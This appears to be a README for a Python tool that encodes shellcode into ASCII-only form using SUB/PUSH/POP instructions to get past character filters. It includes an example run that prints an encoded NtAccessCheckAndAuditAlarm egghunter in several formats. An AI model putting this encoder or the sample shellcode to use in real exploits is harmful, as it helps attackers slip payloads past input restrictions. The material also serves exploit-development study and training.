# BettaEncoder
SUB/PUSH/POP based ASCII shellcode encoder


## **Usage:**

```
Generate shellcode with \x format and save it to file. Then run this command

	***python betta_encoder.py shellcode.txt***

It will generate ASCII equivalent version.

```

This kind of assembly opcodes are generated:

```

AND EAX,554E4D4A  ;  \  Zeroing EAX
AND EAX,2A313235  ;  /  

SUB EAX,5D555D2E  ;  \
SUB EAX,5D555D2E  ;   | Producing original 4 bytes 
SUB EAX,5D555E2F  ;  /

PUSH EAX	  ; Pushing original bytes to stack 

INC ECX		  ; \  NOP-style instructions
INC ECX		  ; /

... and so on

```

## Simple output:

This is example of encoding NTAccessCheckAndAuditAlarm Egghunter using Betta Encoder.


```
C:\Users\User\Desktop>python betta_encoder.py egg.txt
##########################################################################################
$ SUB/PUSH/POP based ASCII shellcode encoder.
$ This technique was originally used by Mati Aharoni (@muts) for bypassing limited character set.
$ Script takes msfvenom output in C format and creates full ascii version by using SUB/PUSH/POP instructions.
$ Encoded shellcode does not jump to decoded version on stack and you should adjust ESP before putting it.
(($)) Written by Abdulla Ismayilov (@infosec_prof)
##########################################################################################
[*] Generated shellcode [Python format]:

shellcode = (
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2e\x5d\x55\x5d"
"\x2d\x2e\x5d\x55\x5d\x2d\x2f\x5e\x55\x5d\x50\x41\x41\x25\x4a"
"\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2e\x5c\x70\x2d\x70"
"\x2e\x5c\x70\x2d\x71\x2d\x5d\x6f\x50\x41\x41\x25\x4a\x4d\x4e"
"\x55\x25\x35\x32\x31\x2a\x2d\x45\x2e\x26\x57\x2d\x45\x2e\x26"
"\x57\x2d\x46\x2f\x28\x57\x50\x41\x41\x25\x4a\x4d\x4e\x55\x25"
"\x35\x32\x31\x2a\x2d\x5b\x6d\x2d\x45\x2d\x5b\x6d\x2d\x45\x2d"
"\x5b\x6c\x2d\x45\x50\x41\x41\x25\x4a\x4d\x4e\x55\x25\x35\x32"
"\x31\x2a\x2d\x41\x53\x37\x2e\x2d\x41\x53\x37\x2e\x2d\x42\x54"
"\x37\x2f\x50\x41\x41\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a"
"\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46"
"\x50\x41\x41\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50"
"\x3f\x39\x31\x2d\x50\x3f\x39\x31\x2d\x51\x3f\x3b\x33\x50\x41"
"\x41\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x2a\x67"
"\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50\x41\x41"
)


**************************************************
[*] Generated shellcode [ASCII format]:


%JMNU%521*-.]U]-.]U]-/^U]PAA%JMNU%521*-p.\p-p.\p-q-]oPAA%JMNU%521*-E.&W-E.&W-F/(WPAA%JMNU%521*-[m-E-[m-E-[l-EPAA%JMNU%521*-AS7.-AS7.-BT7/PAA%JMNU%521*-T7fE-T7fE-V9fFPAA%JMNU%521*-P?91-P?91-Q?;3PAA%JMNU%521*-3*gU-3*gU-4*gUPAA

**************************************************

[*] Binary format:

25 4a 4d 4e 55 25 35 32 31 2a 2d 2e 5d 55 5d 2d 2e 5d 55 5d 2d 2f 5e 55 5d 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 70 2e 5c 70 2d 70 2e 5c 70 2d 71 2d 5d 6f 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 45 2e 26 57 2d 45 2e 26 57 2d 46 2f 28 57 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 5b 6d 2d 45 2d 5b 6d 2d 45 2d 5b 6c 2d 45 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 41 53 37 2e 2d 41 53 37 2e 2d 42 54 37 2f 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 54 37 66 45 2d 54 37 66 45 2d 56 39 66 46 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 50 3f 39 31 2d 50 3f 39 31 2d 51 3f 3b 33 50 41 41 25 4a 4d 4e 55 25 35 32 31 2a 2d 33 2a 67 55 2d 33 2a 67 55 2d 34 2a 67 55 50 41 41

**************************************************

[*] Original size: 32
[*] Encoded  size: 224
```
